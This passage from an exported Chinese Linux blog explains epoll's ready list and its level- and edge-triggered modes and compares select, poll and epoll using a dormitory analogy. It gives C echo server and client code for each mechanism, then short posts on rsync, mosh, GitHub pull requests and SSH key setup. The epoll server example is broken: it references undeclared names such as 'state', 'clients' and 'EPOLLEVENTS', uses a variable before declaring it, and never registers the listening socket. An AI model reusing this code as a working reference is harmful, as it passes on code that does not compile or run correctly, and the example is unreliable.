epoll循环问题的解决\n\nepoll引入了2个中间层，一个双向链表(ready_list)，一个单独的睡眠队列(single_epoll_wait_list)，\n\n\n\nepoll巧妙的引入一个中间层解决了大量监控socket的无效遍历问题。epoll在中间层上为每个监控的socket准备了一个单独的回调函数epoll_callback_sk，而对于select/poll，所有的socket都公用一个相同的回调函数。正是这个单独的回调epoll_callback_sk使得每个socket都能单独处理自身，当自己就绪的时候将自身socket挂入epoll的ready_list。\n\n\n\n同时，epoll引入了一个睡眠队列single_epoll_wait_list，分割了两类睡眠等待。进程不再睡眠在所有的socket的睡眠队列上，而是睡眠在epoll的睡眠队列上，在等待”任意一个socket可读就绪”事件。而中间wait_entry_sk则代替进程睡眠在具体的socket上，当socket就绪的时候，它就可以处理自身了。\n\n\n\n##### 2.3.3 epoll LT ET\n\n　epoll对文件描述符的操作有两种模式：LT（水平触发）和ET（边缘触发），LT模式是默认模式。\n\n+ LT模式：当epoll_wait检测到描述符事件发生并将此事件通知应用程序，应用程序可以不立即处理该事件。下次调用epoll_wait时，会再次响应应用程序并通知此事件。\n\n  \n\n  LT(level triggered)是缺省的工作方式，并且同时支持block和no-block socket.在这种做法中，内核告诉你一个文件描述符是否就绪了，然后你可以对这个就绪的fd进行IO操作。如果你不作任何操作，内核还是会继续通知你的。\n\n  \n\n+ ET模式：当epoll_wait检测到描述符事件发生并将此事件通知应用程序，应用程序必须立即处理该事件。如果不处理，下次调用epoll_wait时，不会再次响应应用程序并通知此事件。\n\n  \n\n  ET(边缘触发)是高速工作方式，只支持no-block socket。在这种模式下，当描述符从未就绪变为就绪时，内核通过epoll告诉你。然后它会假设你知道文件描述符已经就绪，并且不会再为那个文件描述符发送更多的就绪通知，直到你做了某些操作导致那个文件描述符不再为就绪状态了(比如，你在发送，接收或者接收请求，或者发送接收的数据少于一定量时导致了一个EWOULDBLOCK 错误）。\n\n  \n\n  但是请注意，如果一直不对这个fd作IO操作(从而导致它再次变成未就绪)，内核不会发送更多的通知(only once)\n  \n  \n  \n  ET模式在很大程度上减少了epoll事件被重复触发的次数，因此效率要比LT模式高。epoll工作在ET模式的时候，必须使用非阻塞套接口，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。\n\n\n\n当使用epoll的ET模型来工作时，当产生了一个EPOLLIN事件后，读数据的时候需要考虑的是当recv()返回的大小如果等于请求的大小，那么很有可能是缓冲区还有数据未读完，也意味着该次事件还没有处理完，所以还需要再次读取：(阻塞其他的)\n\n\n\n\n### 2.4 总结\n\n+ select，poll实现需要自己不断轮询所有fd集合，直到设备就绪，期间可能要睡眠和唤醒多次交替。而epoll其实也需要调用`epoll_wait`不断轮询就绪链表，期间也可能多次睡眠和唤醒交替，但是它是设备就绪时，调用回调函数，把就绪fd放入就绪链表中，并唤醒在`epoll_wait`中进入睡眠的进程。虽然都要睡眠和交替，但是select和poll在“醒着”的时候要遍历整个fd集合，而epoll在“醒着”的时候只要判断一下就绪链表是否为空就行了，这节省了大量的CPU时间。这就是回调机制带来的性能提升。\n\n+ select，poll每次调用都要把fd集合从用户态往内核态拷贝一次，并且要把current往设备等待队列中挂一次\n\n  而epoll只要一次拷贝，而且把current往等待队列上挂也只挂一次（在epoll_wait的开始，注意这里的等待队列并不是设备等待队列，只是一个epoll内部定义的等待队列）。这也能节省不少的开销。\n\n+ 如果处理的连接数不是很高的话，使用select/epoll的web server不一定比使用多线程 + 阻塞 IO的web server性能更好，可能延迟还更大。select/epoll的优势并不是对于单个连接能处理得更快，而是在于能处理更多的连接。\n\n+ 如果没有大量的idle -connection或者dead-connection，epoll的效率并不会比select/poll高很多，但是当遇到大量的idle- connection，就会发现epoll的效率大大高于select/poll。\n\n+ 在IO multiplexing Model中，实际中，对于每一个socket，一般都设置成为non-blocking，但是，如上图所示，整个用户的进程其实是一直被block的。只不过进程是被select这个函数block，而不是被socket IO给block。\n\n\n\n# 3. 问题总结\n\n### 3.1  我在知乎的回答:\n\nIO模式一般分为同步IO和异步IO.  同步IO会阻塞进程, 异步IO不会阻塞进程. 目前linux上大部分用的是同步IO, 异步IO在linux上目前还不成熟, 不过windows的iocp算是真正的异步IO。\n\n\n\n同步IO又分为阻塞IO, 非阻塞IO, IO多路复用.  What? 同步IO明明会阻塞进程,为什么也包括非阻塞IO?  因为非阻塞IO虽然在请求数据时不阻塞, 但真正数据来临时,也就是内核数据拷贝到用户数据时, 此时进程是阻塞的.\n\n\n\n那么这些IO模式的区别分别是什么? 接下来举个小例子来说明. 假设你现在去女生宿舍楼找自己的女神, 但是你只知道女神的手机号,并不知道女神的具体房间\n\n\n\n先说同步IO的情况,\n\n1. 阻塞IO,   给女神发一条短信, 说我来找你了, 然后就默默的一直等着女神下楼, 这个期间除了等待你不会做其他事情, 属于备胎做法.\n\n\n\n2. 非阻塞IO, 给女神发短信, 如果不回, 接着再发, 一直发到女神下楼, 这个期间你除了发短信等待不会做其他事情, 属于专一做法.\n\n\n\n3. IO多路复用,  是找一个宿管大妈来帮你监视下楼的女生, 这个期间你可以些其他的事情. 例如可以顺便看看其他妹子,玩玩王者荣耀, 上个厕所等等.  IO复用又包括 select, poll, epoll 模式. 那么它们的区别是什么?\n\n\n\n3.1 select大妈    每一个女生下楼, select大妈都不知道这个是不是你的女神, 她需要一个一个询问, 并且select大妈能力还有限, 最多一次帮你监视1024个妹子\n\n\n\n3.2 poll大妈不限制盯着女生的数量,  只要是经过宿舍楼门口的女生, 都会帮你去问是不是你女神\n\n\n\n3.3 epoll大妈不限制盯着女生的数量, 并且也不需要一个一个去问.  那么如何做呢?  epoll大妈会为每个进宿舍楼的女生脸上贴上一个大字条,上面写上女生自己的名字,  只要女生下楼了, epoll大妈就知道这个是不是你女神了, 然后大妈再通知你.\n\n\n\n上面这些同步IO有一个共同点就是, 当女神走出宿舍门口的时候, 你已经站在宿舍门口等着女神的, 此时你属于阻塞状态\n\n\n\n接下来是异步IO的情况\n\n你告诉女神我来了, 然后你就去王者荣耀了, 一直到女神下楼了, 发现找不见你了, 女神再给你打电话通知你, 说我下楼了, 你在哪呢?  这时候你才来到宿舍门口. 此时属于逆袭做法.\n\n\n\n# 4. 代码\n\n### 4.1 select\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <sys/select.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\n  int opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\tint clients[FD_SETSIZE]; \n\tfor (int i = 0; i < FD_SETSIZE; ++i) {\n\t\tclients[i] = -1;\n\t}\n\tfd_set rset, allset;\n\tFD_ZERO(&allset);\n\tFD_SET(server_id, &allset);\n\tint maxfd = server_id;\n\tint maxi = -1;\n\n\twhile (1) {\n\t\trset = allset;\n    // 只监听读描述符\n\t\tint iready = select(maxfd+1, &rset, NULL, NULL, NULL);\n\t\tif (iready < 0) {\n\t\t\tperr_exit(\"select error\");\n\t\t}\n\n\t\tif (FD_ISSET(server_id, &rset)) {\n\t\t\t// 说明有新的 client 写\n\t\t\tsocklen_t len = sizeof(client);\n\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\n\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\t\n\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\tint i = 0;\n\t\t\tfor (; i < FD_SETSIZE; ++i) {\n\t\t\t\tif (clients[i] < 0) {\n\t\t\t\t\tclients[i] = client_id;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (i == FD_SETSIZE) {\n\t\t\t\tfputs(\"too many clients\\n\", stderr);\n\t\t\t\texit(1);\n\t\t\t}\n\t\t\tFD_SET(client_id, &allset);\n\t\t\tif (client_id > maxfd) {\n\t\t\t\tmaxfd = client_id;\n\t\t\t}\n\t\t\tif (i > maxi) {\n\t\t\t\tmaxi = i;\n\t\t\t}\n\t\t\tif (--iready == 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tfor (int i = 0; i <= maxi; ++i) {\n\t\t\tint fd = clients[i];\n\t\t\tif (fd < 0) {\n\t\t\t\tcontinue;\t\n\t\t\t}\n\t\t\tif (FD_ISSET(fd, &rset)) {\n\t\t\t\tint n = Read(fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(fd);\n\t\t\t\t\tFD_CLR(fd, &allset);\n\t\t\t\t\tclients[i] = -1;\n\t\t\t\t} else {\n\t\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t\t}\n\t\t\t\t\tWrite(fd, buf, n);\n\t\t\t\t}\n\t\t\t\tif (--iready == 0) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\treturn 0;\n}\n```\n\n`client.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n\n#define PORT 8000\n#define MAXLINE 1024\nint main(int argc, char* agrv[])\n{\n\tchar buf[MAXLINE];\n\tmemset(buf, 0, sizeof(buf));\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(PF_INET, \"127.0.0.1\", &server.sin_addr);\n\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\twhile (fgets(buf, MAXLINE, stdin) != NULL) {\n\t\tWrite(server_id, buf, strlen(buf));\n\t\tint n = Read(server_id, buf, MAXLINE);\n\t\tif (n == 0) {\n\t\t\tprintf(\"the other side has been closed.\\n\");\n\t\t} else {\n\t\t\tWrite(STDOUT_FILENO, buf, n);\n\t\t}\n\t}\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.2 poll\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <sys/select.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <poll.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\n#define OPEN_MAX 1000\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\t\n\tint opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\n\tstruct pollfd clients[OPEN_MAX];\n\tclients[0].fd = server_id;\n\tclients[0].events = POLLIN;\n\tfor (int i = 1; i < OPEN_MAX; i++) {\n\t\tclients[i].fd = -1;\n\t}\n\n\tint maxi = 0;\n\twhile (1) {\n    // 监听 POLLIN 事件\n\t\tint iready = poll(clients, maxi+1, -1);\t\n\t\tif (iready < 0) {\n\t\t\tperr_exit(\"poll error\");\n\t\t}\n\t\t\n    // 说明 client 来了写\n\t\tif (clients[0].revents & POLLIN) {\n\t\t\tsocklen_t len = sizeof(client);\n\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\t\n\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\n\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\tint i = 1;\n\t\t\tfor (; i < OPEN_MAX; ++i) {\n\t\t\t\tif (clients[i].fd < 0) {\n\t\t\t\t\tclients[i].fd = client_id;\t\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (i == OPEN_MAX) {\n\t\t\t\tfputs(\"too many clients\\n\", stderr);\n\t\t\t\texit(1);\n\t\t\t}\n\n\t\t\tclients[i].events = POLLIN;\n\t\t\tif (i > maxi) {\n\t\t\t\tmaxi = i;\n\t\t\t}\n\t\t\tif (--iready == 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tfor (int i = 1; i <= maxi; ++i) {\n\t\t\tif (clients[i].fd < 0) {\n\t\t\t\tcontinue;\n\t\t\t}\t\n\n\t\t\tif (clients[i].revents & POLLIN) {\n\t\t\t\tint n = Read(clients[i].fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(clients[i].fd);\n\t\t\t\t\tclients[i].fd = -1;\n\t\t\t\t} else {\n\t\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t\t}\n\t\t\t\t\tWrite(clients[i].fd, buf, n);\n\t\t\t\t}\n\t\t\t\tif (--iready == 0) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n`client.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n\n#define PORT 8000\n#define MAXLINE 1024\nint main(int argc, char* agrv[])\n{\n\tchar buf[MAXLINE];\n\tmemset(buf, 0, sizeof(buf));\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(PF_INET, \"127.0.0.1\", &server.sin_addr);\n\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\twhile (fgets(buf, MAXLINE, stdin) != NULL) {\n\t\tWrite(server_id, buf, strlen(buf));\n\t\tint n = Read(server_id, buf, MAXLINE);\n\t\tif (n == 0) {\n\t\t\tprintf(\"the other side has been closed.\\n\");\n\t\t} else {\n\t\t\tWrite(STDOUT_FILENO, buf, n);\n\t\t}\n\t}\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.3 epoll\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <sys/epoll.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\n#define OPEN_MAX 1000\n\nvoid add_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_ADD, fd, &ev);\n}\nvoid modify_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_MOD, fd, &ev);\n}\nvoid delete_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_DEL, fd, &ev);\n}\n\n\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\t\n\tint opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\n\tstruct epoll_event events[EPOLLEVENTS];\n\tint epollfd = epoll_create(FDSIZE);\n\n\tstruct epoll_event ev;\n\tev.events = EPOLLIN;\n\tev.data.fd = STDIN_FILENO;\n\tepoll_ctl(epollfd, EPOLL_CTL_ADD, STDIN_FILENO, &ev);\n\n\twhile (1) {\n\t\tint ret = epoll_wait(epollfd, events, EPOLLEVENTS, -1);\n\t\tfor (int i = 0; i < ret; ++i) {\n\t\t\tint fd = events[i].data.fd;\n\t\t\tif (fd == server_id && (events[i].events & EPOLLIN)) {\n\t\t\t\tsocklen_t len = sizeof(client);\n\t\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\t\n\t\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\n\t\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\t\tstruct epoll_event ev;\n\t\t\t\tev.events = state;\n\t\t\t\tev.data.fd = fd;\n\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_ADD,fd,&ev);\n\n\t\t\t} else if (events[i].events & EPOLLIN) {\n\t\t\t\tint n = Read(clients[i].fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(clients[i].fd);\n\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_DEL,fd,&ev);\n\n\t\t\t\t} else {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLOUT;//由读改为写\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_MOD,fd,&ev);\n\t\t\t\t}\n\n\t\t\t} else if (events[i].events & EPOLLOUT) {\n\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t}\n\t\t\t\tint n = Write(fd, buf, n);\n\t\t\t\tif (n < 0) {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_DEL,fd,&ev);\n\n\t\t\t\t} else {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;//由写改为读\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_MOD,fd,&ev);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tClose(epollfd);\n\n\n\treturn 0;\n}\n```\n\n\n\n`client.c`\n\n```c\n#include <string.h>\n#include <sys/socket.h>\n#include <sys/epoll.h>\n#include <arpa/inet.h>\n#include <string.h>\n#include <stdio.h>\n#include <unistd.h>\n#include \"wrap.h\"\n#include \"epollUtil.h\"\n\n#define IP \"127.0.0.1\"\n#define PORT 8000\n#define FD_SIZE 1024\n#define EPOLLEVENTS 20\nint main(int agrc, char* argv[]) {\n\tchar buf[1024];\n\tmemset(buf, 0, sizeof(buf));\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\n\tserver.sin_family = AF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(AF_INET, IP, &server.sin_addr);\n\t\n\n\tint server_id = Socket(AF_INET, SOCK_STREAM, 0);\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\tstruct epoll_event events[EPOLLEVENTS];\n\tint epollfd = epoll_create(FD_SIZE);\n\tadd_event(epollfd, STDIN_FILENO, EPOLLIN);\n\twhile (1) {\n\t\n\t\tint ret = epoll_wait(epollfd, events, EPOLLEVENTS, -1);\n\t\tfor (int i = 0; i < ret; ++i) {\n\t\t\tint fd = events[i].data.fd;\n\n\t\t\tif (events[i].events & EPOLLIN) {\n\t\t\t\tint n = Read(fd, buf, sizeof(buf));\t\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(fd);\t\n\t\t\t\t} else {\n\t\t\t\t\tif (fd == STDIN_FILENO) {\n\t\t\t\t\t\tadd_event(epollfd, server_id, EPOLLOUT);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tdelete_event(epollfd, server_id, EPOLLIN);\t\n\t\t\t\t\t\tadd_event(epollfd, STDOUT_FILENO, EPOLLOUT);\n\t\t\t\t\t}\t\n\t\t\t\t}\n\t\t\t} else if (events[i].events & EPOLLOUT) {\n\t\t\t\tWrite(fd, buf, strlen(buf));\t\n\t\t\t\tif (fd == STDOUT_FILENO) {\n\t\t\t\t\tdelete_event(epollfd, fd, EPOLLOUT);\n\t\t\t\t} else {\n\t\t\t\t\tmodify_event(epollfd, fd, EPOLLIN);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.4 总结\n\n+ select \n\n  死循环里用 select 阻塞, 返回后开始遍历\n\n+ poll\n\n  死循环里用 poll 阻塞, 返回后开始遍历\n\n+ epoll\n\n  死循环里用 epoll_wait 阻塞\n\n  ","tags":["linux"],"categories":["系统"]},{"title":"rsync同步文件","url":"%2Fp%2Ff67a2ed5.html","content":"\n\n参考链接: http://blog.csdn.net/zpf336/article/details/51659666\n\n\n### 把本地文件同步到远程服务器\n```\nrsync -avz '-e ssh -i /Users/liuwei/.ssh/aws.pem' /Users/liuwei/golang/src/web --progress ubuntu@54.191.9.26:/home/ubuntu\n```\n\n<!-- more -->\n### client\n\n```\nrsync -vzrtopg --progress  ubuntu@54.191.9.26::ftp .   //同步服务器的文件到当前目录\n```\n\n### server\n\n```\n[ftp]\n\n        comment = public archive\n        path = /home/ubuntu/rsync\n        use chroot = yes\n#       max connections=10\n        lock file = /var/lock/rsyncd\n# the default for read only is yes...\n        read only = yes\n        list = yes\n        uid = nobody\n        gid = nogroup\n#       exclude =\n#       exclude from =\n#       include =\n#       include from =\n        auth users =  ubuntu\n        secrets file = /etc/rsyncd.secrets\n        strict modes = yes\n#       hosts allow =\n#       hosts deny =\n        ignore errors = no\n        ignore nonreadable = yes\n        transfer logging = no\n#       log format = %t: host %h (%a) %o %f (%l bytes). Total %b bytes.\n        timeout = 600\n        refuse options = checksum dry-run\n        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz\n\n```\n\n\n\n### 在本地机器上对两个目录同步\n\n```\nrsync -zvr filename1 filename2\n```\n上述代码是将filename1中的文件与filename2中的文件同步\n\n### 使用rsync –a 同步保留时间按标记\n\n```\nrsync -azv filename1 filename2  \n```\n\n使用上述命令，将filename2中新同步的文件的时间与filename1中的创建的时间相同，它保留符号链接、权限、时间标记、用户名及组名相同。\n\n### 将远程服务器的文件同步到本地\n\n```\nrsync -avz ubuntu@192.168.0.1:/home/ubuntu/filename2 filename1 \n```\n\n上述命令是将远程192.168.0.1的主机上filename2同步到本地的filename1。\n注意：如果远程主机的端口不是默认的22端口，假如是4000端口，上述的命令修改为，\n\n```\nrsync -avz '-e ssh -p 4000' ubuntu@192.168.0.1:/home/ubuntu/filename2 filename1 \n```\n\n### 从本地同步文件到远程服务器\n\n```\nrsync -avz filename1 ubuntu@192.168.0.1:/home/ubuntu/filename2  \n```\n上述命令是将本地的filename1同步到远程192.168.0.1的主机上。\n同理如果端口不是22，使用以下命令\n\n```\nrsync -avz '-e ssh -p 4000' filename1 ubuntu@192.168.0.1:/home/ubuntu/filename2  \n```\n","tags":["linux"],"categories":["命令"]},{"title":"mosh解决ssh远程连接延迟","url":"%2Fp%2F21b6636c.html","content":"\n\n### 安装mosh\n```\nsudo apt-get install mosh //server\nbrew install mobile-shell //mac\n```\n\n\n### 需要先设置本地\nlocale-gen zh_CN.UTF-8\n\n### 远程服务器开启 mosh-server\n\n### 需要aws开启udp mosh的端口\n\n### 客户端连接\n\n```\n mosh ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com -ssh=\"ssh -i 'aws.pem'\"\n```\n","tags":["linux"],"categories":["命令"]},{"title":"gitHub提交PullRequest","url":"%2Fp%2Fa35ae0bf.html","content":"\n\n### fork别人的仓库\n首先，在 GitHub 上 fork 到自己的仓库，如 docker_user/blockchain_guide，然后 clone 到本地，并设置用户信息。\n\n```\n$ git clone git@github.com:docker_user/blockchain_guide.git\n$ cd blockchain_guide\n$ #do some change on the content\n$ git commit -am \"Fix issue #1: change helo to hello\"\n$ git push\n```\n\n<!-- more -->\n\n### [remote rejected] master -> master (permission denied)\n\n```\nType command:\n\ngit config --global --edit\nAdd these lines of configuration at the end of file:\n\n[credential]\n  helper = osxkeychain\n  useHttpPath = true\n```\n  \n  \n### 更新自己的仓库\n  \n  ```\n  git remote add upstream https://github.com/unix2dos/GolangWeb\n  git fetch upstream\n  git checkout master\n  git rebase upstream/master\n  git push -f origin master\n  ```\n ","tags":["git"],"categories":["git"]},{"title":"github和gitee通过密钥来进行ssh连接","url":"%2Fp%2Fa9407b5.html","content":"\n## 一. github\n\n#### 1 生成公钥私钥\n\n```\nssh-keygen -t rsa -b 4096 -C \"levonfly@gmail.com\"\n```\n\n第一步sava file 写成github, 密码可以为空\n\n\n\n<!-- more -->\n\n#### 2 添加到github里面\n\n```\ncat github.pub\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDmlu8zfJ+RuSREk0TGjuhujZbuuC1J+nAoQtkAmckfnbD8flJ6OEidSQbTqPRaQKIKObUKGobBeDWoHdJNVDGuyAPnSBnq7LI8ToKha91S4HLf8SNCtQHqCfMReNdPawav9rKN7hwos0Ho6fIMWtSRaJmZkw8gFwj4PuqfxuKzIm/hVaRCia8DJkLcyWfTYJAUkmoQHHIgJyNn0lTxs0AH0UzzfAoXiOzT6KRir5cKxhz+RCbz+ZTxmepDgM0uV/bN/rArJ/98QDknE8R4d5l88fXTR1vR98J7qgOrH+J6H15xtIInqtlGiHjv1FKu79p0t7o3WpajijiSsw8wFjlZ2Y4A8Hdm2+w7eWTUMasPbxWn4Jne2SAOWd4PsoOr3Fp0obH2RjQyibQ/WfGHHpOtJs9zGJoBs9YwmxexhhmHbCqGJ/KO6HYv9DssaLE9qG0gUshSiZtSbmaDOwttg2XfpieERrdt5SM4gsv7/MMQR5V2vZnzaKrh4++8oix48xAl27iR9qFXoqdOkXQ3CVXp15fMuQuhrzO73/mZnw8G0G5r5gzYt9ywwx+Jp9K1DLSrFESOLjAHec/8qbcSn7pUVkVkTUDvE8e+4bVnPRXe+MYa8aKybSx0OVB/foWKJlO5hgik/MHB3kVEQreoDJEv+ts5JIgEEsxtuEqfeDPdvw== levonfly@gmail.com\n```\n添加到  https://github.com/settings/keys\n\n+ ssh-rsa 要复制\n+ 邮箱不复制\n+ 生成的密钥只能用在一个帐号上面\n\n\n\n\n#### 3 测试是否连接到github, 现在带上私钥\n\n```\nssh -T git@github.com -i github\n```\n\n\n#### 4 添加到config, git使用私钥\n\n```\nhost github.com\n HostName github.com\n IdentityFile ~/.ssh/github\n User levon\n```\n\n\n\n## 二. 码云\n\n#### 0 添加的时候一定要添加ssh地址\n\n```\ngit remote add liuwei git@gitee.com:metrics-client-res/ReadingMate.git\n```\n\n#### 1 生成公钥私钥\n\n```\nssh-keygen -t rsa -C \"levonfly@gmail.com\"  \n```\n第一步sava file 写成mayun, 密码可以为空\n\n#### 2 添加到gitee里面\n\n```\ncat ~/.ssh/mayun.pub\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOD++FY3wmtogXUNkSVl7ZLF8jLFJsua79Tvg5ywY+YngvjCW7EsWps7M3MeVYBxht4vuFrA3qeDD3UlTE8hKJUHJaCSrfjWT/uTo9OQKK2hW/nyvNJomz5aqBoArEIPD5Ab6cqpOpMElrUDEKrfW+3FWR++mpS/ig9NNR5l2GuIYIJOt4NOkXPALd8gWjRMPedOI8MJLstK4M7BinMaoSgwOoNWYrEmDXDcJpNt7c40T83npGd5TLfN3Oq50aZwSPfzBJfDzk+kBdplrg+a7YR50TP9/URE4MKrmRToOXyVuCucRn6WTskVbt+lJqBnzO/CkTRvIeOCuaZcQqLoTH levonfly@gmail.com\n```\n添加到地址 https://gitee.com/profile/sshkeys\n\n#### 3 测试是否连接到码云, 现在带上私钥\n\n```\nssh -T git@gitee.com -i mayun\n```\n\n#### 4 添加到config, git使用私钥\n\n```\nhost gitee.com\n HostName gitee.com\n IdentityFile ~/.ssh/mayun\n User 